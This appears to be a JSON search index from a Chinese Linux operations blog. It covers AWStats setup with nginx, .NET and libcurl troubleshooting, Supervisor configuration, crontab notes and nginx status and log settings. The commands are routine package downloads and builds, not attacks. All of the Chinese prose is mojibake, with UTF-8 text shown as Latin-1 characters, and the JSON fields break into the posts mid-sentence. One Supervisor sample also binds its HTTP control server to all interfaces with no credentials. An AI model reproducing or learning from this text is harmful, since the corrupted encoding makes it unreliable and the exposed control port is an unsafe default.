æ­å»ºçš„(perlç¯å¢ƒ)ï¼Œä½†ç”¨äº†ä¸€æ®µæ—¶é—´åï¼Œå‘ç°å®˜æ–¹æä¾›äº†phpç¯å¢ƒçš„é…ç½®ä¿¡æ¯ï¼Œåœ¨/pathto/awstats/tools/nginxä¸­ã€‚ å¦‚æœæœ‰phpç¯å¢ƒï¼Œå°†é‡Œé¢çš„awstats-fcgi.phpå¤åˆ¶åˆ°/pathto/awstats/wwwroot/cgi-bin/ä¸­,é‡å‘½åä¸ºfcgi.phpã€‚ ç„¶åå°†awstats-nginx.confå¤åˆ¶åˆ°è‡ªå·±çš„nginx confä¸‹ï¼Œä¿®æ”¹é‡Œé¢çš„é»˜è®¤è·¯å¾„/usr/share/awstats/wwwroot ä¸ºè‡ªå·±çš„/pathto/awstats/wwwrootè·¯å¾„å³å¯ã€‚awastsçš„å®‰è£…åŠé…ç½®å’Œä¸‹é¢ä¸€æ ·(è·³è¿‡é…ç½®nginx,æµ‹è¯•è·³è¿‡fcgiå¯åŠ¨)ã€‚ 1. å®‰è£…CPANã€FCGIå’ŒFCGI::ProcManager [root@00 ~]# cd /opt/software [root@00 software]# wget http://www.cpan.org/authors/id/A/AN/ANDK/CPAN-2.10.tar.gz [root@00 software]# wget http://www.cpan.org/authors/id/B/BO/BOBTFISH/FCGI-ProcManager-0.24.tar.gz [root@00 software]# tar xzvf CPAN-2.10.tar.gz [root@00 software]# cd CPAN-2.10 [root@00 CPAN-2.10]# perl Makefile.PL [root@00 CPAN-2.10]# make [root@00 CPAN-2.10]# make install [root@00 software]# tar xzvf FCGI-ProcManager-0.24.tar.gz [root@00 software]# cd FCGI-ProcManager-0.24 [root@00 FCGI-ProcManager-0.24]# perl Makefile.PL [root@00 FCGI-ProcManager-0.24]# make [root@00 FCGI-ProcManager-0.24]# make install ## ä¹Ÿå¯ä»¥ä½¿ç”¨yumç›´æ¥å®‰è£…(éœ€è¦å¯¼å…¥epelæº) [root@00 software]# yum install perl-CPAN [root@00 software]# yum install perl-FCGI perl-FCGI-ProcManager 2. å®‰è£…awastsåŠé…ç½® [root@00 software]# wget https://nchc.dl.sourceforge.net/project/awstats/AWStats/7.5/awstats-7.5.zip [root@00 software]# unzip awstats-7.5.zip # è¿™ä¸ªä¸‹è½½çš„æ˜¯zipåŒ…ï¼Œæ‰€ä»¥éœ€è¦unzipè¿›è¡Œè§£å‹ [root@00 software]# find ./awstats-7.5 -type d -name \"*\" -exec chmod 755 {} \\; #è¿™ä¸ªè§£å‹åæ–‡ä»¶å¤¹çš„æƒé™å˜æˆäº†å…¨æƒé™ï¼Œæˆ‘è¿™å„¿æ”¹äº†ä¸‹ [root@00 software]# cp -r awstats-7.5 /data/ #/usr/local/awstats æ˜¯ä»–é»˜è®¤çš„ç›®å½•ï¼Œè¿™å„¿æˆ‘æŠŠä»–æ”¹åˆ°æˆ‘çš„æ•°æ®ç›®å½•ä¸­å» [root@00 data]# chown -Rf www.www awstats #æ›´æ”¹ç”¨æˆ·æ‰€æœ‰è€…æƒé™(nginxæ‰€å±ç»„) [root@00 data]# cd /data [root@00 data]# ln -s /data/awstats-7.5/ /data/awstats #åˆ›å»ºè½¯è¿æ¥ï¼Œç”¨äºç‰ˆæœ¬æ§åˆ¶ï¼Œæ­¤æ­¥éª¤å¯ä»¥ä¸åš [root@00 data]# cd awstats/tools [root@00 tools]# ./awstats_configure.pl ----- AWStats awstats_configure 1.0 (build 20140126) (c) Laurent Destailleur ----- This tool will help you to configure AWStats to analyze statistics for one web server. You can try to use it to let it do all that is possible in AWStats setup, however following the step by step manual setup documentation (docs/index.html) is often a better idea. Above all if: - You are not an administrator user, - You want to analyze downloaded log files without web server, - You want to analyze mail or ftp log files instead of web log files, - You need to analyze load balanced servers log files, - You want to 'understand' all possible ways to use AWStats... Read the AWStats documentation (docs/index.html). -----\u003e Running OS detected: Linux, BSD or Unix Warning: AWStats standard directory on Linux OS is '/usr/local/awstats'. If you want to use standard directory, you should first move all content of AWStats distribution from current directory: /data/awstats-7.5 to standard directory: /usr/local/awstats And then, run configure.pl from this location. Do you want to continue setup from this NON standard directory [yN] ? y #====\u003eæ­¤å¤„æ˜¯å› ä¸ºæˆ‘è½¬ç§»äº†ç›®å½•çš„åŸå› ,å¦‚æœæ˜¯ä½¿ç”¨çš„é»˜è®¤ç›®å½•,æ˜¯æ²¡æœ‰è¿™ä¸ªæç¤ºä¿¡æ¯çš„,è¿™å„¿ç»§ç»­å°±å¯ä»¥äº† -----\u003e Check for web server install Enter full config file path of your Web server. Example: /etc/httpd/httpd.conf Example: /usr/local/apache2/conf/httpd.conf Example: c:\\Program files\\apache group\\apache\\conf\\httpd.conf Config file path ('none' to skip web server setup): \u003e none #è¿™ä¸ªæ˜¯é…ç½®apacheçš„ï¼Œæ­¤æ¬¡ä½¿ç”¨çš„æ˜¯nginxï¼Œæ‰€ä»¥è¿™å„¿ä¸é…ç½® Your web server config file(s) could not be found. You will need to setup your web server manually to declare AWStats script as a CGI, if you want to build reports dynamically. See AWStats setup documentation (file docs/index.html) -----\u003e Update model config file '/usr/local/awstats/wwwroot/cgi-bin/awstats.model.conf' File awstats.model.conf updated. -----\u003e Need to create a new config file ? Do you want me to build a new AWStats config/profile file (required if first install) [y/N] ? y # -----\u003e Define config file name to create What is the name of your web site or profile analysis ? Example: www.mysite.com Example: demo Your web site, virtual server or profile name: \u003e example.com #è¿™ä¸ªé…ç½®æ–‡ä»¶æ˜¯ç»Ÿè®¡example.comè¿™ä¸ªç«™ç‚¹çš„ï¼Œåå­—å¯ä»¥éšä¾¿å†™ï¼Œä¸","date":"2019-02-21","objectID":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","æ—¥å¿—","awstats"],"title":"Awstatsæ—¥å¿—åˆ†æç³»ç»Ÿ","uri":"/posts/linux/awstats%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Dotnetè¿ç»´æ•…éšœè®°å½•","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","dotnet","è§£å†³æ–¹æ¡ˆ"],"title":"Dotnetè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"å®‰è£…æ•…éšœ Failed to load , error: libunwind.so.8: cannot open shared object file: No such file or directory Failed to bind to CoreCLR at â€˜/root/dotnet/shared/Microsoft.NETCore.App/2.0.0/libcoreclr.soâ€˜ yum install libunwind -y FailFast: Couldnâ€˜t find a valid ICU package installed on the system. Set the configuration flag System.Globalization.Invariant to true if you want to run with no globalization support. yum install icu -y ç¨‹åºå¼‚å¸¸ æŠ¥é”™ä¿¡æ¯ The handler does not support custom handling of certificates with this combination of libcurl (7.29.0) and its SSL backend (\"NSS/3.28.4\") æœ€è¿‘æ¥æ”¶åˆ°äº†å¼€å‘åé¦ˆdotnetç¨‹åºå‘é€çŸ­ä¿¡å¼‚å¸¸ï¼Œæ®è¯´ä¹Ÿæ˜¯ä¸€ç›´éƒ½æœ‰çš„é—®é¢˜ï¼ŒååŠ©æŸ¥è¯¢äº†å¤šæ–¹èµ„æ–™ï¼Œå‘ç°æ˜¯libcurlç‰ˆæœ¬çš„é—®é¢˜ï¼Œç”±äºæœåŠ¡å™¨ä¸Šå­˜åœ¨äº†å¤šä¸ªdotnetç«™ç‚¹ï¼Œä¹Ÿä¸æ•¢è½»æ˜“å»å‡çº§ï¼Œåæ¥åˆå¬è¯´æ‰€æœ‰çš„dotnetéƒ½å­˜åœ¨ï¼Œäºæ˜¯å¯¹curlè¿›è¡Œäº†ä¸€æ¬¡å‡çº§ï¼Œé‡å¯dotnetçŸ­ä¿¡æ­£å¸¸ æ¥å…¥ä¸€ä¸ªå†™çš„æ¯”è¾ƒæ¸…æ™°çš„æ–‡ç«  https://blog.azpro.cn/index.php/archives/113/ å‡çº§è¿‡ç¨‹ : # yum install libcurl-openssl -y # wget https://curl.haxx.se/download/curl-7.64.0.tar.gz # tar -xzvf curl-7.64.0.tar.gz # cd curl-7.64.0/ # ./configure --prefix=/opt/curl-7.64.0 --with-ssl # make \u0026\u0026 make install # mv /usr/bin/curl /usr/bin/curl.old # mv /usr/bin/curl-config /usr/bin/curl-config.old # ln -s /opt/curl-7.64.0/ /opt/curl # ln -s /opt/curl/bin/curl /usr/bin/curl # ln -s /opt/curl/bin/curl-config /usr/bin/curl-config # echo \"/opt/curl/lib\" \u003e\u003e /etc/ld.so.conf.d/curl-x86_64.conf # ldconfig ","date":"2019-02-21","objectID":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","dotnet","è§£å†³æ–¹æ¡ˆ"],"title":"Dotnetè¿ç»´æ•…éšœè®°å½•","uri":"/posts/linux/dotnet%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Supervisoræ‰¹é‡è¿›ç¨‹ç®¡ç†","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/","tags":["linux"],"title":"Supervisoræ‰¹é‡è¿›ç¨‹ç®¡ç†","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"supervisor ä¸€ä¸ªç®€å•çš„pythonç¼–å†™çš„è¿›ç¨‹ç®¡ç†å™¨ï¼ŒåŠŸèƒ½ç±»ä¼¼æ˜¯å°†æ™®é€šè¿›ç¨‹ä»¥å®ˆæŠ¤è¿›ç¨‹çš„å½¢å¼è¿è¡Œåˆ°åå° supervisord-monitor ä¸€ä¸ªé›†ä¸­çš„ç®¡ç†å‰ç«¯ https://github.com/mlazarov/supervisord-monitor 1. å®‰è£… $\u003e pip3 install supervisor é…ç½®åŠå¯åŠ¨ # ç”Ÿæˆé…ç½®æ–‡ä»¶ $\u003e echo_supervisord_conf \u003e /etc/supervisord.conf # åˆ›å»ºsystemd ç®¡ç†è„šæœ¬ $\u003e vim /etc/systemd/system/supervisord.service [Unit] Description=Process Monitoring and Control Daemon After=rc-local.service [Service] Type=forking ExecStart=/usr/bin/supervisord -c /etc/supervisord.conf LimitCORE=infinity LimitNOFILE=65535 LimitNPROC=65535 [Install] WantedBy=multi-user.target # # # $\u003e systemctl daemon-reload $\u003e systemctl start supervisord # # supervisorctl statusï¼šæŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹çš„çŠ¶æ€ # supervisorctl stop esï¼šåœæ­¢es # supervisorctl start esï¼šå¯åŠ¨es # supervisorctl restart es: é‡å¯es # supervisorctl update :é…ç½®æ–‡ä»¶ä¿®æ”¹åå¯ä»¥ä½¿ç”¨è¯¥å‘½ä»¤åŠ è½½æ–°çš„é…ç½® # supervisorctl reload: é‡æ–°å¯åŠ¨é…ç½®ä¸­çš„æ‰€æœ‰ç¨‹åº 3. é…ç½®æ–‡ä»¶è¯´æ˜ # æ³¨æ„å®‰è£…çš„ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ä¸€æ ·é…ç½®æ–‡ä»¶æœ‰å·®å¼‚,ä»¥ä¸‹é…ç½®æ–‡ä»¶æ˜¯3.1.4 [unix_http_server] file=/tmp/supervisor.sock ; the path to the socket file [inet_http_server] ; inet (TCP) server disabled by default port=0.0.0.0:9001 ; username=\u003cusername\u003e ; password=\u003cpassword\u003e [supervisord] logfile=/tmp/supervisord.log logfile_maxbytes=50MB logfile_backups=10 loglevel=info pidfile=/tmp/supervisord.pid nodaemon=false silent=false minfds=1024 ; è¿™ä¸ªæ˜¯æœ€å°‘ç³»ç»Ÿç©ºé—²çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä½äºè¿™ä¸ªå€¼supervisorå°†ä¸ä¼šå¯åŠ¨; default 1024 minprocs=200 ; æœ€å°å¯ç”¨çš„è¿›ç¨‹æè¿°ç¬¦ï¼Œä½äºè¿™ä¸ªå€¼supervisorä¹Ÿå°†ä¸ä¼šæ­£å¸¸å¯åŠ¨;default 200 ;directory=/tmp ; default is not to cd during start ;nocleanup=false ; ä¸ºfalseæ—¶ï¼Œå¯åŠ¨ä¼šæ¸…é™¤å†å²çš„å­è¿›ç¨‹æ—¥å¿—; default false ;childlogdir=/tmp ; 'AUTO' child log dir, default $TEMP(python -c \"import tempfile;print tempfile.gettempdir()\") environment=TZ=Asia/Shanghai ; environment=TZ=Asia/Shanghai,TZ=Asia/Shanghai, [rpcinterface:supervisor] supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface [supervisorctl] serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL for a unix socket ; [program:theprogramname] ; command=/bin/cat ; directory=/tmp ; ; process_name=example.com(80) ; autostart=true ; æ˜¯å¦åœ¨ supervisord å¯åŠ¨æ—¶å¯åŠ¨ ; autorestart=true ; å­è¿›ç¨‹æŒ‚æ‰æ—¶å€™è‡ªåŠ¨é‡å¯ ; user=www ; stopasgroup=true ; killasgroup=true ; redirect_stderr=true ; stdout_logfile=/var/log/example.com.log ; stdout_logfile_maxbytes=50MB ; stdout_logfile_backups=10 ; ; environment=TZ=Asia/Shanghai ; ; exitcodes=CODE1,CODE2 ; å…è®¸çš„è¿›ç¨‹é€€å‡ºç ã€‚ä»¥\",\"åˆ†éš”ï¼Œé»˜è®¤ä¸º0,2ã€‚ [include] files = /etc/supervisord.d/*.ini 3.1. é…ç½®å‚æ•°è¯´æ˜ https://blog.csdn.net/lvmuheng/article/details/72367849 [unix_http_server] file=/tmp/supervisor.sock ; socketæ–‡ä»¶çš„è·¯å¾„ï¼Œsupervisorctlç”¨XML_RPCå’Œsupervisordé€šä¿¡å°±æ˜¯é€šè¿‡å®ƒè¿›è¡Œ çš„ã€‚å¦‚æœä¸è®¾ç½®çš„è¯ï¼Œsupervisorctlä¹Ÿå°±ä¸èƒ½ç”¨äº† ä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤ä¸ºnoneã€‚ éå¿…é¡»è®¾ç½® ;chmod=0700 ; è¿™ä¸ªç®€å•ï¼Œå°±æ˜¯ä¿®æ”¹ä¸Šé¢çš„é‚£ä¸ªsocketæ–‡ä»¶çš„æƒé™ä¸º0700 ä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤ä¸º0700ã€‚ éå¿…é¡»è®¾ç½® ;chown=nobody:nogroup ; è¿™ä¸ªä¸€æ ·ï¼Œä¿®æ”¹ä¸Šé¢çš„é‚£ä¸ªsocketæ–‡ä»¶çš„å±ç»„ä¸ºuser.group ä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤ä¸ºå¯åŠ¨supervisordè¿›ç¨‹çš„ç”¨æˆ·åŠå±ç»„ã€‚éå¿…é¡»è®¾ç½® ;username=user ; ä½¿ç”¨supervisorctlè¿æ¥çš„æ—¶å€™ï¼Œè®¤è¯çš„ç”¨æˆ· ä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤ä¸ºä¸éœ€è¦ç”¨æˆ·ã€‚ éå¿…é¡»è®¾ç½® ;password=123 ; å’Œä¸Šé¢çš„ç”¨æˆ·åå¯¹åº”çš„å¯†ç ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨æ˜ç ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨SHAåŠ å¯† å¦‚ï¼š{SHA}82ab876d1387bfafe46cc1c8a2ef074eae50cb1d é»˜è®¤ä¸è®¾ç½®ã€‚ã€‚ã€‚éå¿…é¡»è®¾ç½® ;[inet_http_server] ; ä¾¦å¬åœ¨TCPä¸Šçš„socketï¼ŒWeb Serverå’Œè¿œç¨‹çš„supervisorctléƒ½è¦ç”¨åˆ°ä»– ä¸è®¾ç½®çš„è¯ï¼Œé»˜è®¤ä¸ºä¸å¼€å¯ã€‚éå¿…é¡»è®¾ç½® ;port=127.0.0.1:9001 ; è¿™ä¸ªæ˜¯ä¾¦å¬çš„IPå’Œç«¯å£ï¼Œä¾¦å¬æ‰€æœ‰IPç”¨ :9001æˆ–*:9001ã€‚ è¿™ä¸ªå¿…é¡»è®¾ç½®ï¼Œåªè¦ä¸Šé¢çš„[inet_http_server]å¼€å¯äº†ï¼Œå°±å¿…é¡»è®¾ç½®å®ƒ ;username=user ; è¿™ä¸ªå’Œä¸Šé¢çš„uinx_http_serverä¸€ä¸ªæ ·ã€‚éå¿…é¡»è®¾ç½® ;password=123 ; è¿™ä¸ªä¹Ÿä¸€ä¸ªæ ·ã€‚éå¿…é¡»è®¾ç½® [supervisord] ;è¿™ä¸ªä¸»è¦æ˜¯å®šä¹‰supervisordè¿™ä¸ªæœåŠ¡ç«¯è¿›ç¨‹çš„ä¸€äº›å‚æ•°çš„ è¿™ä¸ªå¿…é¡»è®¾ç½®ï¼Œä¸è®¾ç½®ï¼Œsupervisorå°±ä¸ç”¨å¹²æ´»äº† logfile=/tmp/supervisord.log ; è¿™ä¸ªæ˜¯supervisordè¿™ä¸ªä¸»è¿›ç¨‹çš„æ—¥å¿—è·¯å¾„ï¼Œæ³¨æ„å’Œå­è¿›ç¨‹çš„æ—¥å¿—ä¸æ­å˜ã€‚ é»˜è®¤è·¯å¾„$CWD/supervisord.logï¼Œ$CWDæ˜¯å½“å‰ç›®å½•ã€‚ã€‚éå¿…é¡»è®¾ç½® logfile_maxbytes=50MB ; è¿™ä¸ªæ˜¯ä¸Šé¢é‚£ä¸ªæ—¥å¿—æ–‡ä»¶çš„æœ€å¤§çš„å¤§å°ï¼Œå½“è¶…è¿‡50Mçš„æ—¶å€™ï¼Œä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ—¥ å¿—æ–‡ä»¶ã€‚å½“è®¾ç½®ä¸º0æ—¶ï¼Œè¡¨ç¤ºä¸é™åˆ¶æ–‡ä»¶å¤§å° é»˜è®¤å€¼æ˜¯50Mï¼Œéå¿…é¡»è®¾ç½®ã€‚ logfile_backups=10 ; æ—¥å¿—æ–‡ä»¶ä¿æŒçš„æ•°é‡ï¼Œä¸Šé¢çš„æ—¥å¿—æ–‡ä»¶å¤§äº50Mæ—¶ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°æ–‡ä»¶ã€‚æ–‡ä»¶ æ•°é‡å¤§äº10æ—¶ï¼Œæœ€åˆçš„è€æ–‡ä»¶è¢«æ–°æ–‡ä»¶è¦†ç›–ï¼Œæ–‡ä»¶æ•°é‡å°†ä¿æŒä¸º10 å½“è®¾ç½®ä¸º0æ—¶ï¼Œè¡¨ç¤ºä¸é™åˆ¶æ–‡ä»¶çš„æ•°é‡ã€‚ é»˜è®¤æƒ…å†µä¸‹ä¸º10ã€‚ã€‚ã€‚éå¿…é¡»è®¾ç½® loglevel=info ; æ—¥å¿—çº§åˆ«ï¼Œæœ‰critical, error, warn, info, debug, trace, or blatherç­‰ é»˜è®¤ä¸ºinfoã€‚ã€‚ã€‚éå¿…é¡»è®¾ç½®é¡¹ pidfile=/tmp/supervisord.pid ; supervisordçš„pidæ–‡ä»¶è·¯å¾„ã€‚ é»˜è®¤ä¸º$CWD/supervisord.pidã€‚ã€‚ã€‚éå¿…é¡»è®¾ç½® nodaemon=false ; å¦‚æœæ˜¯trueï¼Œsupervisordè¿›ç¨‹å°†åœ¨å‰å°è¿è¡Œ é»˜è®¤ä¸ºfalseï¼Œä¹Ÿå°±æ˜¯åå°ä»¥å®ˆæŠ¤è¿›ç¨‹è¿è¡Œã€‚ã€‚ã€‚éå¿…é¡»è®¾ç½® minfds=1024 ; è¿™ä¸ªæ˜¯æœ€å°‘ç³»ç»Ÿç©ºé—²çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œä½äºè¿™ä¸ªå€¼supervisorå°†ä¸ä¼šå¯åŠ¨ã€‚ ç³»ç»Ÿçš„æ–‡ä»¶æè¿°ç¬¦åœ¨è¿™é‡Œè®¾ç½®cat /proc/sys/fs/file-max é»˜è®¤æƒ…å†µä¸‹ä¸º1024ã€‚ã€‚ã€‚éå¿…é¡»è®¾ç½® minprocs=200 ; æœ€å°å¯ç”¨çš„è¿›ç¨‹æè¿°ç¬¦ï¼Œä½äºè¿™ä¸ªå€¼supervisorä¹Ÿå°†ä¸ä¼šæ­£å¸¸å¯åŠ¨ã€‚ ulimit -uè¿™ä¸ªå‘½ä»¤ï¼Œå¯ä»¥æŸ¥çœ‹linuxä¸‹é¢ç”¨æˆ·çš„æœ€å¤§è¿›ç¨‹æ•° é»˜è®¤ä¸º200ã€‚","date":"2019-02-21","objectID":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/:0:0","tags":["linux"],"title":"Supervisoræ‰¹é‡è¿›ç¨‹ç®¡ç†","uri":"/posts/linux/supervisor%E6%89%B9%E9%87%8F%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„é—®é¢˜æ”¶é›†","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„é—®é¢˜æ”¶é›†","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„"],"content":"1. è®¡åˆ’ä»»åŠ¡é…ç½®ä¸­/etc/crontabå’Œcrontab -eçš„åŒºåˆ« https://blog.csdn.net/qq_36937234/article/details/80558871 1.1. äºŒè€…å·®å¼‚ çº§åˆ«å·®å¼‚ /etc/crontabæ˜¯ç³»ç»Ÿçº§åˆ«çš„crontabï¼Œç³»ç»Ÿçš„è®¾ç½® crontab -eæ˜¯ç”¨æˆ·çº§çš„crontab linuxä¸‹å®é™…ä¿å­˜åœ¨/var/spool/cron/usernameä¸­ æœ‰äº›ç³»ç»Ÿè®¾ç½®å³ä½¿ç”¨rootè´¦å·crontab -eä¹Ÿä¸è¡Œï¼Œå¿…é¡»æ”¾åˆ°/etc/crontabä¸­ è¯­æ³•åŒºåˆ« /etc/crontab æœ‰ç”¨æˆ·å­—æ®µ */5 * * * * root /root/scripts/refresh.sh \u003e/dev/null 2\u003e\u00261 crontab -eä¸­ä¸èƒ½è®¾ç½®ç”¨æˆ·å­—æ®µ 1 * */1 * * /bin/sh /root/scripts/refresh.sh \u003e /dev/nul 2\u003e\u00261 1.2. æ³¨æ„ç‚¹ /var/spool/clientmqueueç›®å½•è¿‡å¤§ï¼Œå ç”¨ç£ç›˜æ»¡äº† åŸå› ï¼š/var/spool/clientmqueueæ˜¯å¦‚æœç³»ç»Ÿä¸­æœ‰ç”¨æˆ·å¼€å¯äº†cronï¼Œè€Œcronä¸­æ‰§è¡Œçš„ç¨‹åºæœ‰è¾“å‡ºå†…å®¹ï¼Œè¾“å‡ºå†…å®¹ä¼šä»¥é‚®ä»¶å½¢å¼å‘ç»™cronçš„ç”¨æˆ·ï¼Œè€Œsendmailæ²¡æœ‰å¯åŠ¨æ‰€ä»¥å°±äº§ç”Ÿäº†è¿™äº›æ–‡ä»¶ è§£å†³ï¼šå°†è¾“å‡ºé‡å®šå‘ï¼Œå¦‚\u003e /dev/null 2\u003e\u00261ï¼Œè¡¥å……ï¼šé”™è¯¯è¾“å‡ºä¹Ÿè¦é‡å®šå‘ /etc/crontabçš„è¯»å†™æƒé™ ä¸è¦éšæ„æ”¹åŠ¨è¿™ä¸ªæ–‡ä»¶çš„è¯»å†™æƒé™ï¼Œè¿™ä¸ªæ–‡ä»¶åº”è¯¥è®¾ç½®æˆ644æˆ–è€…600ï¼Œå¦åˆ™ä¼šæŠ¥(system) BADã€€FILE MODE (/etc/crontab ) æ‰‹åŠ¨èƒ½å¤Ÿæ‰§è¡Œï¼Œä½†æ˜¯crontabè„šæœ¬é‡Œé¢ä¸æ‰§è¡Œ è§£å†³ï¼šæ£€æŸ¥ä¸‹crontabçš„ç¯å¢ƒå˜é‡ ï¼š HELL=/bin/bash PATH=/sbin:/bin:/usr/sbin:/usr/bin MAILTO=root HOME=/ 2. CentOS 7.x è®¾ç½®å¼€æœºå¯åŠ¨é¡¹æŠ¥é”™ï¼Œæˆ–è½¯è¿æ¥æŠ¥ Too many levels of symbolic links è¿™ä¸ªé—®é¢˜æŠ¥é”™åŸå› å…¶å®å·²ç»è¯´æ˜å¾—å¾ˆæ˜æ˜¾äº†ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨åŒä¸€ä¸ªåœ°æ–¹åˆ›å»ºäº†åŒæ ·åå­—çš„å¤šä¸ªè½¯è¿æ¥ï¼Œä¹‹æ‰€ä»¥è®°å½•æ˜¯åº”ä¸ºç½‘ä¸Šé¬¼æ‰¯äº†ä¸€äº›æ¯«æ— å…³è”è§£å†³æ–¹æ¡ˆï¼Œå¯èƒ½ä¹Ÿå­˜åœ¨é‚£æ ·çš„é—®é¢˜ï¼Œè¿™å„¿é‡è§çš„æ˜¯åœ¨è®¾ç½®å¼€æœºå¯åŠ¨é¡¹systemctl enableçš„æ—¶å€™æŠ¥çš„é”™ï¼Œæ£€æŸ¥äº†ä¸‹å‘ç°ï¼Œsystemctl enableè®¾ç½®çš„ç›®å½•ç¡®å®æ˜¯å·²ç»å­˜åœ¨äº†ä¸€ä¸ªåŒåçš„äº†ï¼ŒæŠŠåŸæ¥çš„é‚£ä¸ªåˆ æ‰æˆ–è€…æ”¹ä¸ªåå­—ï¼Œåœ¨åˆ›å»ºæ­£å¸¸ 3. HTTP å“åº”ç åˆ†ç±» https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status 4. Git å’Œ SVNçš„åŒºåˆ« gitæ˜¯åˆ†å¸ƒå¼çš„ï¼Œsvnæ˜¯é›†ä¸­å¼çš„ gitå­˜å‚¨æ•°æ®æ˜¯ä»¥å…ƒæ•°æ®å½¢å¼å­˜å‚¨ï¼Œsvnæ˜¯æŒ‰æ–‡ä»¶ï¼ŒåŸæ•°æ®æ€æ ·çš„ç»“æ„ï¼Œå­˜å‚¨å°±æ˜¯æ€æ ·çš„ç»“æ„ åˆ†æ”¯ä¸åŒï¼Œsvnçš„åˆ†æ”¯å°±æ˜¯å¤åˆ¶äº†ä¸€ä¸ªç›®å½•å‡ºæ¥ ","date":"2019-02-21","objectID":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/:0:0","tags":["linux","è§£å†³æ–¹æ¡ˆ"],"title":"é‚£äº›æœ‰ç”¨æ²¡ç”¨çš„é—®é¢˜æ”¶é›†","uri":"/posts/other/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%94%B6%E9%9B%86/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"Nginx Location","date":"2019-02-04","objectID":"/posts/linux/nginx-location/","tags":["linux","nginx"],"title":"Nginx Location æ¨¡å—ä»‹ç»","uri":"/posts/linux/nginx-location/"},{"categories":["linux","è¿ç»´è®°äº‹"],"content":"1. å‰è¨€ ä¸ªäººæ•´ç†,å¯å‚è€ƒ 2. ä¼˜åŒ– 2.1. å‚æ•°è¯´æ˜ worker_processes : è¿›ç¨‹æ•° worker_connections : æœ€å¤§è¿æ¥æ•° (æœ€å¤§å¹¶å‘è¿æ¥=è¿›ç¨‹æ•°xæœ€å¤§è¿æ¥æ•°) autoindex : å½“ä¸»é¡µä¸å­˜åœ¨çš„æ—¶å€™ï¼Œæ˜¾ç¤ºç›®å½•ç»“æ„ 2.2. nginx çŠ¶æ€è¯´æ˜ é…ç½®æ–¹æ³•: server { listen port; server_name status.example.com; location / { stub_status on; access_log off; allow 10.0.0.0/24; deny all; } } Active connections : å•ä½æ—¶é—´å†…æœåŠ¡å™¨æ­£åœ¨å¤„ç†çš„è¿æ¥æ•° server : æ­¤å¯åŠ¨åˆ°ç°åœ¨ä¸€å…±å¤„ç†çš„è¿æ¥ accepts : ä»å¯åŠ¨åˆ°ç°åœ¨æˆåŠŸåˆ›å»ºå¤šå°‘æ¬¡æ¡æ‰‹(å’Œserverç›¸åŒè¡¨ç¤ºæ²¡æœ‰å¤±è´¥) handled requests : å·²ç»å¤„ç†å®Œæ¯•çš„è¯·æ±‚æ•° Reading: : nginx è¯»å–åˆ°å®¢æˆ·ç«¯çš„headerä¿¡æ¯æ•° Writing : è¿”å›ç»™å®¢æˆ·ç«¯çš„headerä¿¡æ¯æ•° Waiting : å·²ç»å¤„ç†å®Œç­‰å¾…ä¸‹ä¸€æ¬¡è¯·æ±‚åˆ¶å®šçš„é©»ç•™æ•°(åœ¨å¼€å¯keep-aliveæ—¶ï¼Œè¯¥å€¼ç­‰äºactive-(reading+writing)) 2.3. nginx æ—¥å¿— æ—¥å¿—è¯­æ³•(é…ç½®äºhttpæ ‡ç­¾å†…): log_format name string â€¦; æ—¥å¿—å‚æ•°è¯´æ˜: $remote_addr : è®¿é—®ç½‘ç«™çš„å®¢æˆ·ç«¯åœ°å€ $remote_user : 